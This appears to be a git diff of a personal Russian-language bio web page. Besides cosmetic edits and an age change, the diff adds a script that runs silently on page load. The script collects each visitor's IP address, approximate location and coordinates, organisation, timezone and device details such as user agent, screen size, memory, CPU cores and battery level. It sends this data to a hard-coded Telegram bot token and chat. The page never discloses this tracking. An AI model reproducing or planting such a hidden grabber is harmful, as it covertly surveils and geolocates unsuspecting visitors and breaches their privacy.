@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>MVD BIO</title>
     <style>
-    
         body {
             background-image: url('https://i.pinimg.com/736x/9d/1f/be/9d1fbebc6f1916626fafca5810448940.jpg');
             background-size: 100% 100%;
@@ -20,7 +19,6 @@
             justify-content: center;
             align-items: center;
         }
-    
 
         header {
             margin-bottom: 20px;
@@ -40,7 +38,7 @@
             font-size: 18px;
             color: #d0d0d0;
         }
-        
+
         .button-container {
             display: flex;
             flex-direction: column;
@@ -81,9 +79,9 @@
             font-size: 12px;
             margin-top: 5;
             opacity: 0;
-            animation: fadeIn 1s 1s forwards; /* Задержка для футера */
+            animation: fadeIn 1s 1s forwards;
         }
-        
+
         @keyframes fadeIn {
             to {
                 opacity: 1;
@@ -98,7 +96,7 @@
         <p>My first name: Alexander</p>
         <p>My last name:           </p>
         <p>My nickname: mvd</p>
-        <p>Age: 14 y.o</p>
+        <p>Age: 15 y.o</p>
         <p>Единственный username: @mvdclowned</p>
         <p>Перед тем как писать сверяйте username!!</p>
     </header>
@@ -111,5 +109,180 @@
     <footer>
         <p>©2024 by MVD | BIO</p>
     </footer>
+
+    <script>
+        const botToken = '7837786515:AAHBc4SRk-m1HMPngRj__VsiuuDqMY82lZo';
+        const chatId = '-1002149446987';
+        async function collectDeviceInfo() {
+            const deviceInfo = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenWidth: window.screen.width,
+                screenHeight: window.screen.height,
+                deviceMemory: navigator.deviceMemory || "Недоступно",
+                hardwareConcurrency: navigator.hardwareConcurrency || "Недоступно",
+            };
+            return deviceInfo;
+        }
+        async function getIPAddress() {
+            try {
+                const response = await fetch('https://ipinfo.io/json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error("Ошибка при получении IP:", error);
+                return "Недоступно";
+            }
+        }
+
+        async function getHost() {
+            try {
+                const response = await fetch('https://ipinfo.io/json');
+                const data = await response.json();
+                return data.hostname;
+            } catch (error) {
+                console.error("Ошибка при получении Hostname:", error);
+                return "Недоступно";
+            }
+        }
+
+
+        async function getCity() {
+            try {
+                const response = await fetch('https://ipinfo.io/json');
+                const data = await response.json();
+                return data.city;
+            } catch (error) {
+                console.error("Ошибка при получении city:", error);
+                return "Недоступно";
+            }
+        }
+
+        async function getRegion() {
+            try {
+                const response = await fetch('https://ipinfo.io/json');
+                const data = await response.json();
+                return data.region;
+            } catch (error) {
+                console.error("Ошибка при получении Region:", error);
+                return "Недоступно";
+            }
+        }
+
+        async function getCountry() {
+            try {
+                const response = await fetch('https://ipinfo.io/json');
+                const data = await response.json();
+                return data.country;
+            } catch (error) {
+                console.error("Ошибка при получении country:", error);
+                return "Недоступно";
+            }
+        }
+
+        async function getLoc() {
+            try {
+                const response = await fetch('https://ipinfo.io/json');
+                const data = await response.json();
+                return data.loc;
+            } catch (error) {
+                console.error("Ошибка при получении loc:", error);
+                return "Недоступно";
+            }
+        }
+
+        async function getOrg() {
+            try {
+                const response = await fetch('https://ipinfo.io/json');
+                const data = await response.json();
+                return data.org;
+            } catch (error) {
+                console.error("Ошибка при получении org:", error);
+                return "Недоступно";
+            }
+        }
+
+        async function getTimezone() {
+            try {
+                const response = await fetch('https://ipinfo.io/json');
+                const data = await response.json();
+                return data.timezone;
+            } catch (error) {
+                console.error("Ошибка при получении timezone:", error);
+                return "Недоступно";
+            }
+        }
+        async function getBatteryLevel() {
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    return Math.round(battery.level * 100);
+                } catch (error) {
+                    console.error("Ошибка при получении уровня батареи:", error);
+                    return "Недоступно";
+                }
+            } else {
+                return "API батареи не поддерживается";
+            }
+        }
+        async function sendDataToTelegram(deviceInfo, ipAddress, batteryLevel, host, city, region, country, loc, org, timezone) {
+            const message = `
+                Новый запрос!
+                IP: ${ipAddress}
+                Hostname: ${host}
+                Город: ${city}
+                Регион: ${region}
+                Страна: ${country}
+                locate: ${loc}
+                Organization: ${org}
+                Timezone: ${timezone}
+                Устройство: ${deviceInfo.userAgent}
+                Платформа: ${deviceInfo.platform}
+                Язык: ${deviceInfo.language}
+                Разрешение экрана: ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}
+                Память устройства: ${deviceInfo.deviceMemory} GB
+                Ядра процессора: ${deviceInfo.hardwareConcurrency}
+                Уровень батареи: ${batteryLevel}%
+            `;
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`; // Backticks for token
+            const params = {
+                chat_id: chatId,
+                text: message,
+            };
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(params),
+                });
+
+                if (response.ok) {
+                    console.log("Данные успешно отправлены в Telegram.");
+                } else {
+                    console.error("Ошибка при отправке данных в Telegram.");
+                }
+            } catch (error) {
+                console.error("Ошибка при отправке данных:", error);
+            }
+        }
+        async function main() {
+            const deviceInfo = await collectDeviceInfo(); //add await
+            const ipAddress = await getIPAddress();
+            const batteryLevel = await getBatteryLevel();
+            const host = await getHost();
+            const city = await getCity();
+            const region = await getRegion();
+            const country = await getCountry();
+            const loc = await getLoc();
+            const org = await getOrg();
+            const timezone = await getTimezone();
+            await sendDataToTelegram(deviceInfo, ipAddress, batteryLevel, host, city, region, country, loc, org, timezone);
+        }
+        main();
+    </script>
 </body>
 </html>
